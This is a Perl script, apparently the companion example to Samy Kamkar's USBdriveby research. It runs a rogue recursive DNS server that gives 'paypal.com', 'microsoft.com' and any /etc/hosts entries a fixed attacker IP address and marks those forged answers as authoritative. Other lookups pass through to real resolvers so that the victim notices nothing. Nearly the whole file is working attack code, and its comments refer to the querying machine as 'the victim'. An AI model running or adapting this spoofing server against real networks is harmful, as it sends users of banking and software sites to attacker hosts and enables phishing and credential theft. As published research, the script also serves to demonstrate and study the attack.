#!/usr/bin/perl
#
# recursive DNS server which spoofs specific hosts
# created as an example for USBdriveby
# http://samy.pl/usbdriveby
#
# you can spoof hosts by adding them to your /etc/hosts
# or by adding them to the array below
#
# -samy kamkar, dec 16

# to install Net::DNS, run:
# perl -MCPAN -e 'install Net::DNS'

use strict;
use Net::DNS::Nameserver;

# hosts to spoof, or add them to /etc/hosts
my %spoof = (
	'paypal.com' => '72.14.179.47',
	'microsoft.com' => '72.14.179.47',
);

# real nameservers to resolve hosts through
my @ns = qw/4.2.2.2 4.2.2.3/;

# hosts file path
my $hostsfile = "/etc/hosts";


# read in /etc/hosts for more spoofed domains
open(HOSTS, "<$hostsfile") || die "Can't read $hostsfile: $!";
while (<HOSTS>)
{
	if (/^\s*(\d+\.\d+\.\d+\.\d+)\s+([^#\s]+)/)
	{
		$spoof{lc($2)} = $1;
	}
}
close(HOSTS);


my $resolver = new Net::DNS::Resolver(
	nameservers => \@ns,
	recurse => 1,
);

sub reply_handler
{
	my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
	my ($rcode, @ans, @auth, @add);
	my $err = "NOERROR";

	print "Received query from $peerhost to ". $conn->{sockhost}. "\n";
	$query->print;

	# if the victim is attempting to lookup a domain we're spoofing
	if ($spoof{lc($qname)})
	{
		# spoof a response!
		my ($ttl, $rdata) = (3600, $spoof{lc($qname)});
		my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
		push @ans, $rr;
	}

	# look up a real host and respond appropriately
	else
	{
		my $ret = $resolver->search($qname, $qtype);
		if ($ret && $ret->{answer})
		{
			push @ans, @{$ret->{answer}};
		}
		else
		{
			$err = "NXDOMAIN";
		}
	}

	# mark the answer as authoritive by setting the 'aa' flag
	return ($err, \@ans, \@auth, \@add, { aa => 1 });
}

my $ns = new Net::DNS::Nameserver(
		LocalPort    => 5354,
		LocalAddr		 => '127.0.0.1',
		ReplyHandler => \&reply_handler,
		Verbose      => 1
) || die "couldn't create nameserver object\n";

$ns->main_loop;
